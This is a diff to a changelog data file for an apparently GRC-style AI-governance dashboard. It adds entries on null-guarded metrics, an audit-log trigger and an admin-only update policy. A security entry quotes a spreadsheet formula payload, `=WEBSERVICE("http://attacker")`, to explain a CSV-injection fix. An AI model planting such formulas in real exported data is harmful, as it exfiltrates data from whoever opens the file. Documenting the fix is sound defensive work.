@@ -1475,7 +1475,7 @@ export const RELEASES: Release[] = [
 ]
 
 export const UNRELEASED: UnreleasedChanges = {
-  "entryCount": 46,
+  "entryCount": 54,
   "entries": [
     {
       "type": "feat",
@@ -1489,6 +1489,70 @@ export const UNRELEASED: UnreleasedChanges = {
       "type": "fix",
       "scope": "security",
       "summary": "**close CSV formula injection (CWE-1236) in data exports.** New `dashboard/src/lib/csv.ts` (`toCsv`/`downloadCsv`) prefixes any cell beginning with `= + - @`/tab/CR with `'`, so a spreadsheet renders `=WEBSERVICE(\"http://attacker\")` as text instead of executing it when an auditor opens the file — and quotes every field per RFC 4180, which the hand-rolled exporters did not (a comma in a category broke the row; a `JSON.stringify`'d name still executed). Many exported fields are attacker-influenceable (a vendor name, an owner, a resource tag synced from a connected integration), so this is a real exposure in an export-heavy GRC product, not a theoretical one. `ModelRegistry` and `VendorRegistry` migrated onto the safe util; the remaining ~22 hand-rolled exporters are tracked as **TD-021** with the full list, being migrated incrementally rather than in one unreviewed overnight sweep that could silently regress audit-export columns. 14 new tests (CSV injection/quoting, faceted-filter derivation).",
+      "breaking": false,
+      "sha": null,
+      "section": null
+    },
+    {
+      "type": "fix",
+      "scope": "honesty",
+      "summary": "**null-guard KPI metrics in 4 more pages.** TrustEngineDashboard: traces/violations show '—' when analytics is null (consistent with trust index tile). GovernanceMesh: error rate '—' when no executions. BenchmarkingMaturity: overall level, gap score, trajectory '—' when empty; hardcoded `industryPercentile = 68` labeled as simulated. PolicyFirewall: block rate '—' when no evaluations.",
+      "breaking": false,
+      "sha": null,
+      "section": null
+    },
+    {
+      "type": "fix",
+      "scope": "honesty",
+      "summary": "**null-guard doc-jsonb and derived fields across 5 pages.** Agents.tsx: `trustScore`, `dailyCallCount`, `totalCallsLifetime`, `avgLatencyMs`, `maxBudget` wrapped in null checks with '—' fallback; `avgTrust` stat returns null (not 0) when no agents have declared trust scores. ModelDetail: drift score renders '—' instead of '0%' when no telemetry exists. AIImpactAssessments: `progressPct` null guard prevents 'undefined%' crash. IncidentLog: remediation `progressPct` null guard with '—' fallback and safe bar width.",
+      "breaking": false,
+      "sha": null,
+      "section": null
+    },
+    {
+      "type": "docs",
+      "scope": "modules",
+      "summary": "**100% guide coverage (135/135).** GenAI Risk Profiles doc written (`genai-risk-profiles.md`), completing the last undocumented sidebar destination. Compliance mappings updated (EU AI Act Art. 9, ISO 42001 6.1.2/A.5.4). 23 additional stub module docs expanded to full template format in the same pass.",
+      "breaking": false,
+      "sha": null,
+      "section": null
+    },
+    {
+      "type": "docs",
+      "scope": "modules",
+      "summary": "**autopilot.md rewritten from stub to full template** — Purpose, Why it exists, How it works, Features table, Interlinks, Compliance mapping (EU AI Act Art. 14, ISO/IEC 42001 A.9.2), Operations.",
+      "breaking": false,
+      "sha": null,
+      "section": null
+    },
+    {
+      "type": "feat",
+      "scope": "compliance",
+      "summary": "**DB-side audit trail for ai_models (TD-018 closed, EU AI Act Art. 12).** New `fn_audit_governed()` trigger function writes append-only rows to `audit_log` on every INSERT/UPDATE/DELETE against `ai_models`, capturing the actor (from `auth.uid()` / JWT email), org, before/after JSON, and action. Fires in the database so it also captures direct-SQL and service-role writes the app layer would miss. EXECUTE revoked from anon/authenticated to prevent PostgREST RPC exposure. Migration: `20260902000001_audit_trigger_ai_models_art12.sql`.",
+      "breaking": false,
+      "sha": null,
+      "section": null
+    },
+    {
+      "type": "fix",
+      "scope": "rls",
+      "summary": "**admin-gate organisation edits on live; lineage-agnostic migration.** Any authenticated user could rename the organisation via the Supabase client — the base `organizations_isolation` policy is FOR ALL. A new RESTRICTIVE FOR UPDATE policy gates writes on `is_org_admin()` (owner/admin role). The migration detects which auth primitives exist and does the right thing on either lineage (repo's `auth.has_permission` or live's `get_user_org_id`), avoiding the TD-000 defect where permissive policies OR-combine. Also fixed a latent bug in `is_org_admin()`: it was SECURITY DEFINER with `search_path=''` but referenced `user_profiles` unqualified, so every call errored. Migration: `20260901000003_organization_settings_writable.sql`.",
+      "breaking": false,
+      "sha": null,
+      "section": null
+    },
+    {
+      "type": "fix",
+      "scope": "models",
+      "summary": "**unmeasured accuracy/latency renders \"—\", never a fabricated 0.** `accuracy` and `latencyMs` in `seed.ts` and `modelMapping.ts` are now `null` (not `0`), and both KPI tile rows in ModelDetail guard null with a `—` in neutral colour. Same pattern as the fairness fix. Register dialog starts new models with null metrics.",
+      "breaking": false,
+      "sha": null,
+      "section": null
+    },
+    {
+      "type": "docs",
+      "scope": "debt",
+      "summary": "**TD-020 — live DB diverged from repo migration lineage.** Documents the four drifted primitives, the four migrations applied live via MCP, and the decision needed before `supabase db push` becomes safe again.",
       "breaking": false,
       "sha": null,
       "section": null
